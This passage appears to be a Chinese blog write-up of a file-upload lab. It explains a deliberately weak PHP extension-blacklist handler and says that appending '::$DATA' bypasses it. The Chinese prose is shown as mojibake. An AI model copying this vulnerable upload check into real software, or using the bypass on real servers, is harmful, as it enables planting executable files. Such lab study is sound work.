·ç”¨é»‘åå•è¿‡æ»¤åç¼€åã€‚ä½†æ˜¯ç¨‹åºä¸­æ²¡æœ‰å¯¹::$DATA è¿›è¡Œè¿‡æ»¤å¯ä»¥æ·»åŠ ::$DATA ç»•è¿‡ä¸Šä¼ </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µPHPä»£ç æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ å¤„ç†è„šæœ¬ï¼Œä¸»è¦ç”¨äºæ¥æ”¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶æ ¹æ®æ–‡ä»¶æ‰©å±•åè¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥ã€‚å¦‚æœæ–‡ä»¶æ‰©å±•åä¸åœ¨ç¦æ­¢åˆ—è¡¨ä¸­ï¼Œåˆ™å°†æ–‡ä»¶ç§»åŠ¨åˆ°æŒ‡å®šçš„ä¸Šä¼ ç›®å½•ã€‚ä»¥ä¸‹æ˜¯ä»£ç çš„è¯¦ç»†è§£é‡Šï¼ŒåŒ…æ‹¬è¯­æ³•å’Œé€»è¾‘ã€‚</p><h3 id="ä»£ç ç»“æ„"><a href="#ä»£ç ç»“æ„" class="headerlink" title="ä»£ç ç»“æ„"></a>ä»£ç ç»“æ„</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// åˆå§‹åŒ–ä¸Šä¼ çŠ¶æ€ä¸ºfalse</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// åˆå§‹åŒ–é”™è¯¯æ¶ˆæ¯ä¸ºç©º</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123; <span class="comment">// æ£€æŸ¥æ˜¯å¦æäº¤äº†è¡¨å•</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123; <span class="comment">// æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨</span></span><br><span class="line">        <span class="comment">// å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å</span></span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// è·å–æ–‡ä»¶åå¹¶å»é™¤é¦–å°¾ç©ºæ ¼</span></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼ˆå‡è®¾deldotæ˜¯è‡ªå®šä¹‰å‡½æ•°ï¼‰</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// è·å–æ–‡ä»¶æ‰©å±•å</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// å»é™¤æ‰©å±•åé¦–å°¾çš„ç©ºæ ¼</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123; <span class="comment">// æ£€æŸ¥æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­</span></span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">// ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; <span class="comment">// å°†ä¸´æ—¶æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„</span></span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®ä¸Šä¼ çŠ¶æ€ä¸ºtrue</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>; <span class="comment">// è®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;</span>; <span class="comment">// æ–‡ä»¶æ‰©å±•ååœ¨ç¦æ­¢åˆ—è¡¨ä¸­ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>; <span class="comment">// ä¸Šä¼ ç›®å½•ä¸å­˜åœ¨ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä»£ç è¯¦ç»†è§£é‡Š-2"><a href="#ä»£ç è¯¦ç»†è§£é‡Š-2" class="headerlink" title="ä»£ç è¯¦ç»†è§£é‡Š"></a>ä»£ç è¯¦ç»†è§£é‡Š</h3><h4 id="1-åˆå§‹åŒ–å˜é‡-2"><a href="#1-åˆå§‹åŒ–å˜é‡-2" class="headerlink" title="1. åˆå§‹åŒ–å˜é‡"></a>1. åˆå§‹åŒ–å˜é‡</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>; <span class="comment">// åˆå§‹åŒ–ä¸Šä¼ çŠ¶æ€ä¸ºfalse</span></span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>; <span class="comment">// åˆå§‹åŒ–é”™è¯¯æ¶ˆæ¯ä¸ºç©º</span></span><br></pre></td></tr></table></figure><ul><li><code>$is_upload</code>ï¼šå¸ƒå°”å˜é‡ï¼Œç”¨äºæ ‡è®°æ–‡ä»¶æ˜¯å¦ä¸Šä¼ æˆåŠŸã€‚</li><li><code>$msg</code>ï¼šå­—ç¬¦ä¸²å˜é‡ï¼Œç”¨äºå­˜å‚¨é”™è¯¯æ¶ˆæ¯æˆ–æç¤ºä¿¡æ¯ã€‚</li></ul><h4 id="2-æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤-2"><a href="#2-æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤-2" class="headerlink" title="2. æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤"></a>2. æ£€æŸ¥è¡¨å•æ˜¯å¦æäº¤</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>$_POST[&#39;submit&#39;]</code>ï¼šæ£€æŸ¥è¡¨å•æ˜¯å¦é€šè¿‡POSTæ–¹æ³•æäº¤ã€‚<code>submit</code>æ˜¯è¡¨å•ä¸­æäº¤æŒ‰é’®çš„åç§°ã€‚</li><li><code>isset()</code>ï¼šæ£€æŸ¥å˜é‡æ˜¯å¦å·²è®¾ç½®ä¸”ä¸ä¸º<code>null</code>ã€‚å¦‚æœè¡¨å•æäº¤æŒ‰é’®è¢«ç‚¹å‡»ï¼Œ<code>$_POST[&#39;submit&#39;]</code>ä¼šè¢«è®¾ç½®ã€‚</li></ul><h4 id="3-æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨-2"><a href="#3-æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨-2" class="headerlink" title="3. æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨"></a>3. æ£€æŸ¥ä¸Šä¼ ç›®å½•æ˜¯å¦å­˜åœ¨</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>UPLOAD_PATH</code>ï¼šå¸¸é‡ï¼Œè¡¨ç¤ºæ–‡ä»¶ä¸Šä¼ çš„ç›®æ ‡ç›®å½•è·¯å¾„ã€‚</li><li><code>file_exists()</code>ï¼šæ£€æŸ¥æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœä¸Šä¼ ç›®å½•ä¸å­˜åœ¨ï¼Œè„šæœ¬ä¼šè¿›å…¥<code>else</code>åˆ†æ”¯ã€‚</li></ul><h4 id="4-å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å-1"><a href="#4-å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å-1" class="headerlink" title="4. å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å"></a>4. å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•å</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«æ‰€æœ‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•åã€‚è¿™äº›æ‰©å±•åé€šå¸¸å¯¹åº”äºå¯æ‰§è¡Œè„šæœ¬æˆ–å¯èƒ½è¢«ç”¨äºæ¶æ„ç›®çš„çš„æ–‡ä»¶ç±»å‹ã€‚</li></ul><h4 id="5-è·å–å¹¶å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å-1"><a href="#5-è·å–å¹¶å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å-1" class="headerlink" title="5. è·å–å¹¶å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å"></a>5. è·å–å¹¶å¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ–‡ä»¶å</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// è·å–æ–‡ä»¶åå¹¶å»é™¤é¦–å°¾ç©ºæ ¼</span></span><br><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>); <span class="comment">// åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼ˆå‡è®¾deldotæ˜¯è‡ªå®šä¹‰å‡½æ•°ï¼‰</span></span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;name&#39;]</code>ï¼šè·å–ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åã€‚</li><li><code>trim()</code>ï¼šå»é™¤å­—ç¬¦ä¸²é¦–å°¾çš„ç©ºæ ¼ã€‚</li><li><code>deldot()</code>ï¼šè‡ªå®šä¹‰å‡½æ•°ï¼Œç”¨äºåˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼ˆ<code>.</code>ï¼‰ã€‚å¯èƒ½æ˜¯ä¸ºäº†é˜²æ­¢ç±»ä¼¼<code>test.php.</code>çš„æ–‡ä»¶åç»•è¿‡æ‰©å±•åæ£€æŸ¥ã€‚</li></ul><h4 id="6-æå–æ–‡ä»¶æ‰©å±•å-1"><a href="#6-æå–æ–‡ä»¶æ‰©å±•å-1" class="headerlink" title="6. æå–æ–‡ä»¶æ‰©å±•å"></a>6. æå–æ–‡ä»¶æ‰©å±•å</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>); <span class="comment">// è·å–æ–‡ä»¶æ‰©å±•å</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">// è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line"><span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">// å»é™¤æ‰©å±•åé¦–å°¾çš„ç©ºæ ¼</span></span><br></pre></td></tr></table></figure><ul><li><code>strrchr($file_name, &#39;.&#39;)</code>ï¼šä»æ–‡ä»¶åä¸­æå–æœ€åä¸€ä¸ª<code>.</code>åŠå…¶åé¢çš„å†…å®¹ï¼Œå³æ–‡ä»¶æ‰©å±•åã€‚</li><li><code>strtolower()</code>ï¼šå°†æ‰©å±•åè½¬æ¢ä¸ºå°å†™ï¼Œç¡®ä¿åç»­æ¯”è¾ƒä¸å—å¤§å°å†™å½±å“ã€‚</li><li><code>trim()</code>ï¼šå»é™¤æ‰©å±•åé¦–å°¾çš„ç©ºæ ¼ã€‚</li></ul><h4 id="7-æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­-1"><a href="#7-æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­-1" class="headerlink" title="7. æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­"></a>7. æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li><code>in_array($file_ext, $deny_ext)</code>ï¼šæ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨<code>$deny_ext</code>ä¸­ã€‚</li><li>å¦‚æœæ‰©å±•åä¸åœ¨ç¦æ­¢åˆ—è¡¨ä¸­ï¼Œç»§ç»­åç»­æ“ä½œï¼›å¦åˆ™ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯å¹¶ç»ˆæ­¢å¤„ç†ã€‚</li></ul><h4 id="8-ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„-1"><a href="#8-ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„-1" class="headerlink" title="8. ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„"></a>8. ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; <span class="comment">// è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„</span></span><br><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>; <span class="comment">// ç”Ÿæˆç›®æ ‡æ–‡ä»¶è·¯å¾„</span></span><br></pre></td></tr></table></figure><ul><li><code>$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]</code>ï¼šè·å–ä¸Šä¼ æ–‡ä»¶çš„ä¸´æ—¶å­˜å‚¨è·¯å¾„ã€‚</li><li><code>UPLOAD_PATH</code>ï¼šç›®æ ‡ä¸Šä¼ ç›®å½•ã€‚</li><li><code>date(&quot;YmdHis&quot;)</code>ï¼šç”Ÿæˆå½“å‰æ—¶é—´æˆ³ï¼Œæ ¼å¼ä¸º<code>YYYYMMDDHHMMSS</code>ã€‚</li><li><code>rand(1000,9999)</code>ï¼šç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼ŒèŒƒå›´ä¸º1000åˆ°9999ã€‚</li><li><code>$img_path</code>ï¼šæ‹¼æ¥ç”Ÿæˆæœ€ç»ˆçš„ç›®æ ‡æ–‡ä»¶è·¯å¾„ï¼Œæ ¼å¼ä¸º<code>UPLOAD_PATH/YYYYMMDDHHMMSSéšæœºæ•°.æ‰©å±•å</code>ã€‚</li></ul><h4 id="9-ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶-1"><a href="#9-ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶-1" class="headerlink" title="9. ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶"></a>9. ç§»åŠ¨ä¸Šä¼ æ–‡ä»¶</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    <span class="variable">$is_upload</span> = <span class="literal">true</span>; <span class="comment">// è®¾ç½®ä¸Šä¼ çŠ¶æ€ä¸ºtrue</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>; <span class="comment">// è®¾ç½®é”™è¯¯æ¶ˆæ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>move_uploaded_file($temp_file, $img_path)</code>ï¼šå°†ä¸´æ—¶æ–‡ä»¶ä»<code>$temp_file</code>ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„<code>$img_path</code>ã€‚<ul><li>å¦‚æœç§»åŠ¨æˆåŠŸï¼Œè®¾ç½®<code>$is_upload</code>ä¸º<code>true</code>ï¼Œè¡¨ç¤ºä¸Šä¼ æˆåŠŸã€‚</li><li>å¦‚æœç§»åŠ¨å¤±è´¥ï¼Œè®¾ç½®é”™è¯¯æ¶ˆæ¯ä¸ºâ€œä¸Šä¼ å‡ºé”™ï¼â€ã€‚</li></ul></li></ul><h4 